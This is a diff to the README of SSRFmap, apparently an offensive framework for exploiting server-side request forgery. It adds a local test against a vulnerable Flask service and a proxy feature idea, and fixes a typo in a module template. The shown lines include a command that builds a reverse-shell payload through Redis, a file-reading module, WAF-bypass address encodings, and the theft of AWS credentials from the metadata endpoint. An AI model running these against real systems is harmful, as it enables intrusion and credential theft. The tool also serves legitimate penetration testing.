@@ -31,6 +31,13 @@ python ssrfmap.py -r data/request.txt -p url -m redis --lhost=127.0.0.1 --lport=
 # --lhost and --lport work like in Metasploit, these values are used to create a reverse shell payload
 ```
 
+A quick way to test the framework can be done with `data/example.py` SSRF service.
+
+```powershell
+FLASK_APP=data/example.py flask run &
+python ssrfmap.py -r data/request.txt -p url -m readfiles
+```
+
 ## Contribute
 
 I <3 pull requests :)
@@ -39,6 +46,7 @@ Feel free to add any feature listed below or a new service.
 - --level arg - ability to tweak payloads in order to bypass some IDS/WAF. E.g: `127.0.0.1 -> [::] -> 0000: -> ...`
 - networkscan - same a portscan, we want to discover machines in the same network
 - aws and other cloud providers - extract sensitive data from http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy and more
+- sockserver  - SSRF SOCK proxy server - https://github.com/iamultra/ssrfsocks
 
 The following code is a template if you wish to add a module interacting with a service.
 
@@ -47,7 +55,7 @@ from core.utils import *
 import logging
 
 name        = "servicename in lowercase"
-description = "ServiceName RCE - What does it d"
+description = "ServiceName RCE - What does it do"
 author      = "Name or pseudo of the author"
 
 class exploit():
